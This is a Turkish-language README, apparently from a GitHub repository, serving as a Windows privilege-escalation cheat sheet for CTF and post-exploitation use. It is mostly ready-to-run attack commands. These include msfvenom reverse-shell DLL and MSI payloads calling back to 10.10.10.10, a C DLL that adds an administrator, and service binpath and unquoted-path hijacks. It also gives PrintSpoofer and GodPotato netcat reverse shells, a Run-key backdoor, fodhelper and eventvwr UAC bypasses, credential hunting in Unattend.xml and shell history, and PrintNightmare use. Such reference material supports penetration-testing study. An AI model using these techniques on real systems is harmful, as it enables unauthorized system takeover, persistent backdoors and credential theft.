# 🪟 Windows Yetki Yükseltme (Privilege Escalation) - Kapsamlı Başvuru Kılavuzu

[🇬🇧 English](../../README.md)

```
  ██╗    ██╗██╗███╗   ██╗██████╗  ██████╗ ██╗    ██╗███████╗
  ██║    ██║██║████╗  ██║██╔══██╗██╔═══██╗██║    ██║██╔════╝
  ██║ █╗ ██║██║██╔██╗ ██║██║  ██║██║   ██║██║ █╗ ██║███████╗
  ██║███╗██║██║██║╚██╗██║██║  ██║██║   ██║██║███╗██║╚════██║
  ╚███╔███╔╝██║██║ ╚████║██████╔╝╚██████╔╝╚███╔███╔╝███████║
   ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚══════╝
  ██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗ ██████╗
  ██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝██╔════╝
  ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗██║     
  ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║██║     
  ██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║╚██████╗
  ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝
```

<p align="center">
  <img src="https://img.shields.io/badge/Windows-PrivEsc-blue?style=for-the-badge" alt="Windows PrivEsc">
  <img src="https://img.shields.io/badge/Sömürü_Sonrası-orange?style=for-the-badge" alt="Sömürü Sonrası">
  <img src="https://img.shields.io/badge/SYSTEM-Erişimi-red?style=for-the-badge" alt="SYSTEM">
  <img src="https://img.shields.io/badge/CTF-Hazır-green?style=for-the-badge" alt="CTF">
</p>

<p align="center">
  <b>🔓 Windows sistemlerinde yerel kullanıcıdan Administrator veya NT AUTHORITY\SYSTEM yetkilerine yükselme kılavuzu</b>
</p>

---

## 📋 İçindekiler

- [Numaralandırma ve Bilgi Toplama](#-numaralandırma-ve-bilgi-toplama)
- [Servis İzinlerini İstismar Etme (Service Exploitation)](#-servis-izinlerini-istismar-etme-service-exploitation)
- [Tırnaksız Servis Yolları (Unquoted Service Paths)](#-tırnaksız-servis-yolları-unquoted-service-paths)
- [DLL Ele Geçirme (DLL Hijacking)](#-dll-ele-geçirme-dll-hijacking)
- [AlwaysInstallElevated Politikası](#-alwaysinstallelevated-politikası)
- [Kayıtlı Kimlik Bilgileri (Stored Credentials)](#-kayıtlı-kimlik-bilgileri-stored-credentials)
- [Token Manipülasyonu ve Ayrıcalıklar](#-token-manipülasyonu-ve-ayrıcalıklar)
- [Patates Saldırıları (Potato Attacks)](#-patates-saldırıları-potato-attacks)
- [Kayıt Defteri Açıkları (Registry Exploits)](#-kayıt-defteri-açıkları-registry-exploits)
- [Zamanlanmış Görevler (Scheduled Tasks)](#-zamanlanmış-görevler-scheduled-tasks)
- [UAC Atlatma (UAC Bypass)](#-uac-atlatma-uac-bypass)
- [Çekirdek Açıkları (Kernel Exploits)](#-çekirdek-açıkları-kernel-exploits)
- [Hızlı Başvuru ve Kontrol Listesi](#-hızlı-başvuru-ve-kontrol-listesi)

---

## 🔍 Numaralandırma ve Bilgi Toplama

### Sistem Bilgisi (CMD)

```cmd
# Sistem ve donanım özeti
systeminfo
hostname

# İşletim sistemi ve yapı (build) numarası
ver
wmic os get caption,version,buildnumber

# Mimari
echo %PROCESSOR_ARCHITECTURE%

# Yüklü güvenlik güncellemeleri ve Hotfix'ler
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Kullanıcı ve Grup Bilgisi

```cmd
# Mevcut kullanıcı ve güvenlik ayrıcalıkları (En kritik komut!)
whoami
whoami /all
whoami /priv
whoami /groups

# Sistemdeki kullanıcılar ve yerel yöneticiler grubu
net user
net localgroup administrators

# Belirli bir kullanıcının ayrıntıları
net user kullanici_adi
```

### Ağ ve Bağlantı Bilgisi

```cmd
# Ağ yapılandırması
ipconfig /all

# Yönlendirme tablosu
route print

# Dinleyen ve aktif portlar
netstat -ano
netstat -an | findstr LISTENING

# ARP tablosu ve DNS önbelleği
arp -a
ipconfig /displaydns
```

### Süreçler ve Servisler

```cmd
# Çalışan süreçler
tasklist
tasklist /svc
wmic process list full

# Servisler
sc query
net start
wmic service list brief

# Yüklü sürücüler
driverquery
```

### PowerShell ile Hızlı Keşif

```powershell
# Sistem bilgisi
Get-ComputerInfo

# Kullanıcılar ve Yöneticiler
Get-LocalUser
Get-LocalGroupMember Administrators

# Servisler ve Süreçler
Get-Service
Get-Process

# Yüklü üçüncü taraf yazılımlar
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, Publisher, InstallDate
```

---

## ⚙️ Servis İzinlerini İstismar Etme (Service Exploitation)

### Zafiyetli Servisleri Tespit Etme

```cmd
# Sysinternals accesschk ile izinleri denetleme
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *

# Belirli bir servisin yapılandırmasını inceleme
sc qc servis_adi
```

### Zayıf Servis Yapılandırması (Weak Service Permissions)
Servisin ikili yolunu (`binpath`) değiştirme hakkınız (`SERVICE_CHANGE_CONFIG`) varsa:

```cmd
# 1. Servisin çalıştıracağı komutu kötü amaçlı bir çalıştırılabilir dosya ile değiştirin:
sc config servis_adi binpath= "C:\Users\Public\shell.exe"

# Veya mevcut kullanıcınızı yerel yöneticiler grubuna ekleyen bir komut verin:
sc config servis_adi binpath= "net localgroup administrators kullanici /add"

# 2. Servisi yeniden başlatın:
sc stop servis_adi
sc start servis_adi
```

### Zayıf Servis Dosyası İzinleri (Weak Binary Permissions)
Servisin çalıştırdığı `.exe` dosyasında yazma izniniz varsa:

```cmd
# İzinleri kontrol edin
icacls "C:\Program Files\Service\binary.exe"

# Dosyayı kötü amaçlı shell.exe ile değiştirin ve servisi yeniden başlatın:
copy shell.exe "C:\Program Files\Service\binary.exe"
sc stop servis_adi
sc start servis_adi
```

---

## 📂 Tırnaksız Servis Yolları (Unquoted Service Paths)

### Zafiyeti Tespit Etme
Eğer bir servis yolu boşluk içeriyor ve çift tırnak (`"..."`) içine alınmamışsa, Windows yolu boşluklardan itibaren sırayla çalıştırmayı dener:

```cmd
# Tırnaksız servis yollarını bulma
wmic service get name,pathname,displayname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell ile:
Get-WmiObject win32_service | Select-Object Name,PathName | Where-Object {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'}
```

### İstismar Mantığı
Örnek yol: `C:\Program Files\Vulnerable Service\service.exe`  
Windows şu sırayla çalıştırmayı arar:
1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable Service\service.exe`

```cmd
# Yazma hakkınız olan ara yola kötü amaçlı dosyanızı kopyalayın:
copy shell.exe "C:\Program Files\Vulnerable.exe"

# Servisi yeniden başlatın:
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

---

## 📚 DLL Ele Geçirme (DLL Hijacking)

Uygulamanın yüklemeye çalıştığı ancak bulamadığı bir DLL dosyası (`NAME NOT FOUND`), arama yolundaki yazılabilir bir dizine yerleştirilerek kod çalıştırılır.

### Kötü Amaçlı DLL Üretme
```bash
# msfvenom ile ters kabuk DLL'i üretme
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll -o evil.dll
```

### C ile Özel Yönetici Ekleyen DLL
```c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}
```

```cmd
# DLL dosyasını uygulamanın arama yaptığı dizine kopyalayın
copy evil.dll "C:\Program Files\App\missing.dll"
# Servisi veya programı yeniden başlatın
```

---

## 📦 AlwaysInstallElevated Politikası

Eğer sistemde Windows Installer'ın tüm MSI paketlerini her zaman SYSTEM yetkileriyle kurmasını sağlayan kayıt defteri anahtarları aktifse:

### Denetleme
```cmd
# Her iki değerin de dword:0x1 olması gerekir
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### İstismar
```bash
# Saldırgan makinede MSI paketi üretin
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o evil.msi

# Hedef makinede sessizce çalıştırın (SYSTEM yetkisinde açılır)
msiexec /quiet /qn /i evil.msi
```

---

## 🔑 Kayıtlı Kimlik Bilgileri (Stored Credentials)

### Windows Kimlik Yöneticisi (Credential Manager)
```cmd
# Kaydedilmiş kimlik bilgilerini listele
cmdkey /list

# Kayıtlı kimlik bilgisi varsa onun adına komut çalıştır:
runas /savecred /user:Administrator cmd.exe
```

### Kayıt Defterinde Açık Parolalar
```cmd
# Otomatik oturum açma (Winlogon Autologon)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# VNC parolaları
reg query "HKCU\Software\ORL\WinVNC3\Password"

# PuTTY kayıtlı oturumlar
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### Metin ve Yapılandırma Dosyalarında Parola Arama
```cmd
# Tüm dosyalarda "password" kelimesini ara
findstr /si password *.txt *.xml *.ini *.config
findstr /spin "password" *.*

# Unattended kurulum dosyaları (Kurulum parolaları açık metindir)
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml
type C:\Windows\System32\sysprep.inf
type C:\Windows\System32\sysprep\sysprep.xml

# PowerShell komut geçmişi
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# IIS web.config dosyası
type C:\inetpub\wwwroot\web.config
```

---

## 🎭 Token Manipülasyonu ve Ayrıcalıklar

`whoami /priv` komutunu çalıştırın. Aşağıdaki izinler kritik yetki yükseltme vektörleridir:

| Ayrıcalık (Privilege) | Risk Seviyesi | İstismar Yöntemi |
|-----------------------|---------------|------------------|
| `SeImpersonatePrivilege` | Kritik | Patates (Potato) saldırıları ile anında SYSTEM |
| `SeAssignPrimaryTokenPrivilege` | Kritik | Süreç token taklidi |
| `SeBackupPrivilege` | Yüksek | Tüm dosyaları (SAM, SYSTEM) kısıtlama olmadan okuma |
| `SeRestorePrivilege` | Yüksek | Sistem dosyalarının üzerine yazma |
| `SeDebugPrivilege` | Yüksek | LSASS sürecinden bellek dökümü alma |
| `SeLoadDriverPrivilege` | Yüksek | Zafiyetli çekirdek sürücüsü yükleme |

---

## 🥔 Patates Saldırıları (Potato Attacks)

Özellikle IIS (`iis apppool\defaultapppool`) veya `LOCAL SERVICE` gibi servis hesapları varsayılan olarak `SeImpersonatePrivilege` yetkisine sahiptir. Bu yetki doğrudan `NT AUTHORITY\SYSTEM` yetkisine geçiş sağlar.

### PrintSpoofer (Windows 10, Server 2016 / 2019)
Yazdırma kuyruğu servisini (Print Spooler) Named Pipe üzerinden taklit ederek SYSTEM kabuğu açar:
```cmd
# İnteraktif SYSTEM kabuğu
PrintSpoofer.exe -i -c cmd

# Ters bağlantı çalıştırma
PrintSpoofer.exe -c "C:\Users\Public\nc.exe 10.10.10.10 4444 -e cmd"
```

### GodPotato (Windows 10/11, Server 2019 - 2022)
Modern DCOM RPC mimarisini kullanarak en güncel Windows sürümlerinde bile SYSTEM kabuğu elde eder:
```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe 10.10.10.10 4444"
```

### JuicyPotato (Eski Sürümler: Windows 7, 8, Server 2008-2016)
```cmd
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

---

## 📝 Kayıt Defteri Açıkları (Registry Exploits)

### Başlangıç Programları (Autoruns)
```cmd
# Başlangıçta çalışan uygulamaları sorgulayın
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Yazma yetkiniz varsa kendi arka kapınızı ekleyin:
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Evil /t REG_SZ /d "C:\Users\Public\shell.exe"
```

---

## ⏰ Zamanlanmış Görevler (Scheduled Tasks)

```cmd
# Sistemdeki görevleri listeleme
schtasks /query /fo TABLE

# PowerShell ile:
Get-ScheduledTask | Select-Object TaskName, TaskPath, State

# Görevin çalıştırdığı betik dosyasında yazma hakkınız varsa komut ekleyin:
echo net localgroup administrators user /add >> C:\Scripts\backup.bat
```

---

## 🛡️ UAC Atlatma (UAC Bypass)

Kullanıcınız `Administrators` grubunda olduğu halde tam yetkili yönetici olarak çalışmıyorsa UAC atlatma teknikleri kullanılır:

### Fodhelper Bypass (Windows 10)
```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
fodhelper.exe

# İşiniz bitince temizlik:
reg delete HKCU\Software\Classes\ms-settings /f
```

### EventViewer Bypass
```cmd
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

---

## 💣 Çekirdek Açıkları (Kernel Exploits)

| CVE / Kod | Etkilenen Sistemler | Açık Adı |
|-----------|---------------------|----------|
| MS17-010 | Windows 7 / 2008 / Vista | **EternalBlue** |
| CVE-2020-0796 | Windows 10 / Server 2019 (v1903-1909) | **SMBGhost** |
| CVE-2021-34527 | Neredeyse tüm Windows sürümleri | **PrintNightmare** |

### PrintNightmare (CVE-2021-34527)
```powershell
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Password123!" -DriverName "Xerox"
```

---

## 📊 Hızlı Başvuru ve Kontrol Listesi

### Hızlı Tek Satırlık Komutlar
```cmd
# Temel sistem ve kimlik özeti
whoami /all & systeminfo & net user

# Ayrıcalıkları kontrol et
whoami /priv

# Servis yollarını incele
wmic service get name,pathname | findstr /i /v "c:\windows"
```

### Otomatik Tarama Araçları

| Araç | Açıklama |
|------|----------|
| **WinPEAS** | Windows için en popüler ve kapsamlı renkli analiz aracı |
| **PowerUp** | Zayıf servis ve kayıt defteri açıklarını bulan PowerShell betiği |
| **Seatbelt** | C# tabanlı kapsamlı güvenlik denetim aracı |
| **SharpUp** | Hafif C# zafiyet kontrol modülü |

### Hızlı Kontrol Listesi (Checklist)

- [ ] `whoami /priv` ile `SeImpersonate` var mı? Varsa PrintSpoofer / GodPotato çalıştırın.
- [ ] Tırnaksız servis yolları (Unquoted Service Paths) var mı?
- [ ] Servis çalıştırılabilir dosyalarında (binaries) yazma hakkı var mı?
- [ ] `AlwaysInstallElevated` kayıt defteri anahtarları aktif mi?
- [ ] `cmdkey /list` ile kaydedilmiş kimlik bilgisi var mı?
- [ ] `Unattend.xml` veya geçmiş dosyalarında açık metin parola var mı?
- [ ] Zamanlanmış görevlerin çalıştırdığı dosyalarda yazma hakkı var mı?
- [ ] Yama eksikliği nedeniyle bilinen bir çekirdek açığı var mı?

---

## 📚 Kaynaklar

- [LOLBAS (Living Off The Land Binaries and Scripts)](https://lolbas-project.github.io/)
- [HackTricks Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

<p align="center">
  <b>🪟 SYSTEM Yetkisini Ele Geçirin!</b><br>
  <i>Windows yetki yükseltme tekniklerinde uzmanlaşın</i>
</p>
